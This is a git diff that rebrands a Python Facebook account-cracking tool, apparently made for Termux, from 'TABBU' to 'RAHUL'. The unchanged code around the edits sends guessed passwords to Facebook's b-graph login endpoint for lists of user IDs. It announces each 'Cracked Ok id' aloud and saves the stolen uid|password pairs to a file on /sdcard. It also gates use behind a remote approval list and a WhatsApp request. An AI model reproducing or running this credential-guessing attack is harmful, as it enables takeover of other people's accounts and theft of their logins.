@@ -606,16 +606,19 @@ def line():print(f'\r\n\33[38;5;37m━━━━━━━━━━━━━━━
 
 
 logo = f"""
- \033[1;97m ████████  █████  ██████  ██████  ██    ██ 
-   \033[1;32m  ██    ██   ██ ██   ██ ██   ██ ██    ██   
-   \033[1;97m  ██    ███████ ██████  ██████  ██    ██   
-    \033[1;32m ██    ██   ██ ██   ██ ██   ██ ██    ██ 
-     \033[1;32m██    ██   ██ ██████  ██████   ██████
+ \033[1;97m  /$$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$      
+| $$__  $$ /$$__  $$| $$  | $$| $$  | $$| $$      
+| $$  \ $$| $$  \ $$| $$  | $$| $$  | $$| $$      
+| $$$$$$$/| $$$$$$$$| $$$$$$$$| $$  | $$| $$      
+| $$__  $$| $$__  $$| $$__  $$| $$  | $$| $$      
+| $$  \ $$| $$  | $$| $$  | $$| $$  | $$| $$      
+| $$  | $$| $$  | $$| $$  | $$|  $$$$$$/| $$$$$$$$
+|__/  |__/|__/  |__/|__/  |__/ \______/ |________/
 \33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mDEVELOPER   \33[38;5;160m▶  \033[1;97mMUHAMMAD TABASSUM
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mGITHUB      \33[38;5;160m▶  \033[1;97mTabbu Arain
+\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mDEVELOPER   \33[38;5;160m▶  \033[1;97mRAHUL X TYPING 
+\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mGITHUB      \33[38;5;160m▶  \033[1;97mRAHUL
 \33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mFEATURES    \33[38;5;160m▶  \033[1;97mOLD CLONING 
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mVERSION     \33[38;5;160m▶  \033[1;97mFREE \33[38;5;37m≫ \033[1;97mUPDATED 2.0
+\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mVERSION     \33[38;5;160m▶  \033[1;97mTRAIL \33[38;5;37m≫ \033[1;97mUPDATED 2.0
 \33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 
 def clear():
@@ -729,7 +732,7 @@ def login1(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\33[38;5;37m-\x1b[38;5;46mS1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mRAHUL\33[38;5;37m-\x1b[38;5;46mS1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
@@ -779,8 +782,8 @@ def login1(uid):
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mRAHUL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/RAHUL-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -840,8 +843,8 @@ def login2(uid):
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mRAHUL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/RAHUL-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -851,7 +854,7 @@ def login3(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\33[38;5;37m-\x1b[38;5;46mS3\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mRAHUL\33[38;5;37m-\x1b[38;5;46mS3\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
@@ -896,13 +899,13 @@ def login3(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mRAHUL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/RAHUL-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mRAHUL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/RAHUL-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -957,13 +960,13 @@ def login4(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mRAHUL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/RAHUL-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mRahul\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/RAHUL-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -973,10 +976,10 @@ def meyexudi():
   os.system('clear')
   print(logo)
   
-  uuid = "md"+str(os.getuid())+"tabbu"+str(os.getuid())+"FREE.TOOL"
+  uuid = "md"+str(os.getuid())+"rahul"+str(os.getuid())+"FREE.TOOL"
   id = ''.join(uuid)
   try:
-    httpCaht = requests.get(f"https://github.com/Prince890890ww/Yo/blob/main/Prince.txt").text
+    httpCaht = requests.get(f"https://github.com/suru11111111111111111111111111111111/Approval-/blob/main/Approval.txt").text
     if id in httpCaht:
       msg = str(os.geteuid())
       print()
@@ -990,7 +993,7 @@ def meyexudi():
       print(" \x1b[0m║══[KEY]  : "+id)
       uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
       input(' \033[1;30m╚══[•] IF U WANT APPROVAL FOR FREE THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+994402197773?text='+tks),approval()       
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+9106391471?text='+tks),approval()       
   except:
     sys.exit()
 print(logo)
